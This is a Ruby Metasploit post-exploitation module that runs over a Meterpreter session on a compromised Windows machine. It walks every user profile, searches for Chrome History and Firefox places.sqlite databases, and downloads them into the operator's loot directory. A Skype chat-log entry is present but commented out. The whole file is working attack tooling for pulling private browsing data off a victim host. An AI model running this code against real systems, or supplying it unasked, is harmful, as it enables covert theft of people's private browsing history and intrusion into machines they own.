##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'csv'
require 'msf/core/post/windows/user_profiles'
require 'msf/core/post/windows/registry'


class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Registry

  STORE_FILE_TYPE = 'binary/db'

  def initialize(info={})
    super( update_info( info,
        'Name' => 'Windows Gather Skype, Firefox, and Chrome Artifacts',
        'Description' => %q{
          Gathers Skype chat logs, Firefox history, and Chrome history data from the target machine.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Joshua Harper <josh[at]radixtx.com>' # @JonValt
        ],
        'Platform' => %w{ win },
        'SessionTypes' => [ 'meterpreter' ]
      ))
  end

  #
  # Execute the module.
  #
  def run
    print_status("Gathering user profiles")

    files_to_gather = [
            {:path => 'LocalAppData', :name => "ChromeHistory", :dir => "Google", :fname => "History"},
            # {:path => 'LocalAppData', :name => "ChromeArchivedHistory", :dir => "Google", :fname => "Archived History."},
            # {:path => 'AppData', :name => 'Skype', :dir => 'Skype', :fname => "main.db"},
            {:path => 'AppData', :name => "Firefox", :dir => "Mozilla", :fname => "places.sqlite"}
    ]
    @result         = []
    grab_user_profiles.each do |userprofile|
      files_to_gather.each { |f| download_artifact(userprofile, f) }
    end
    pub_json_result(true,
                    nil,
                    @result,
                    self.uuid)
  end

  #
  # Check to see if the artifact exists on the remote system.
  #
  def check_artifact(profile, opts={})
    path = profile[opts[:path]]
    dir = opts[:dir]

    dirs = session.fs.dir.foreach(path).collect

    return dirs.include? dir
  end

  #
  # Download the artifact from the remote system if it exists.
  #
  def download_artifact(profile, opts={})
    name = opts[:name]

    print_status("Checking for #{name.force_encoding("utf-8")} artifacts...")
    if !check_artifact(profile, opts)
      print_error("#{name.force_encoding("utf-8")} directory not found for #{profile['UserName'].force_encoding("utf-8")}")
      return false
    end

    print_good("#{name.force_encoding("utf-8")} directory found #{profile['UserName'].force_encoding("utf-8")}")

    fname = opts[:fname]
    dir = opts[:dir]
    path = opts[:path]

    artifact_path = "#{profile[path].force_encoding("utf-8")}\\#{dir.force_encoding("utf-8")}"
    file = session.fs.file.search(artifact_path, "#{fname.force_encoding("utf-8")}", true)

    return false unless file

    file.each do |db|
      guid = db['path'].split('\\')
      # Using store_local for full control of output filename. Forensics software can be picky about the files it's given.
      locatfilename = "#{Time.now.to_i.to_s}_#{profile['UserName'].force_encoding("utf-8")}_#{name.force_encoding("utf-8")}_#{guid.last}_#{fname.force_encoding("utf-8")}"
      localpath     = File.join(Msf::Config.loot_directory, locatfilename)
      remotepath = "#{db['path'].force_encoding("utf-8")}#{session.fs.file.separator}#{db['name'].force_encoding("utf-8")}"
      print_status("Downloading #{remotepath.force_encoding("utf-8")}")
      client.fs.file.download_file(localpath, remotepath)
      print_good("#{name.force_encoding("utf-8")} artifact file saved to #{localpath.force_encoding("utf-8")}")
      @result << {:name => name, :remotepath => remotepath, :localpath => localpath,:locatfilename => locatfilename}
    end
    return true
  end
end
